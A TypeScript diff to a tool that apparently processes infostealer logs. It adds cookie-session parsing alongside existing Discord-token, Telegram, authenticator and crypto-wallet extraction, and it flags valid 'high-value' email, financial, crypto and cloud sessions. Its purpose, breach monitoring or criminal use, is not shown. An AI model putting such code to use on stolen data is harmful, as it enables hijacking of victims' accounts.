@@ -9,6 +9,7 @@ import { parseAllDiscordTokens } from "./stealer-parsers/discord-parser"
 import { parseAllTelegramSessions } from "./stealer-parsers/telegram-parser"
 import { parseAllAuthenticatorData } from "./stealer-parsers/authenticator-parser"
 import { parseAllCryptoWallets } from "./stealer-parsers/wallet-parser"
+import { parseAllCookieSessions } from "./stealer-parsers/cookie-session-analyzer"
 import {
   insertDiscordTokens,
   insertTelegramSessions,
@@ -17,6 +18,7 @@ import {
   getDiscordTokensByDevice,
   updateDiscordTokenValidation,
 } from "./db-messaging-helpers"
+import { insertCookieSessions } from "./db-cookie-helpers"
 import { validateDiscordTokensBatch } from "./discord-validator"
 
 /**
@@ -31,12 +33,14 @@ export async function parseAndStoreMessagingWalletData(
   telegram_sessions: number
   authenticator_data: number
   crypto_wallets: number
+  cookie_sessions: number
 }> {
   const counts = {
     discord_tokens: 0,
     telegram_sessions: 0,
     authenticator_data: 0,
     crypto_wallets: 0,
+    cookie_sessions: 0,
   }
 
   try {
@@ -90,6 +94,31 @@ export async function parseAndStoreMessagingWalletData(
     if (wallets.length > 0) {
       counts.crypto_wallets = await insertCryptoWallets(deviceId, wallets)
       console.log(`✅ Found ${counts.crypto_wallets} crypto wallet(s)`)
+    }
+
+    // Parse cookie sessions
+    if (progressCallback) {
+      await progressCallback(85, "🍪 Analyzing cookie sessions...")
+    }
+
+    const cookieSessions = parseAllCookieSessions(extractionDir)
+    if (cookieSessions.length > 0) {
+      counts.cookie_sessions = await insertCookieSessions(deviceId, cookieSessions)
+      console.log(`✅ Found ${counts.cookie_sessions} authenticated session(s)`)
+
+      // Log high-value sessions
+      const highValue = cookieSessions.filter(
+        (s) =>
+          s.session_valid &&
+          ["email", "financial", "crypto", "cloud", "development"].includes(
+            s.service_category,
+          ),
+      )
+      if (highValue.length > 0) {
+        console.log(
+          `🔥 Found ${highValue.length} high-value session(s): ${highValue.map((s) => s.service).join(", ")}`,
+        )
+      }
     }
 
     if (progressCallback) {
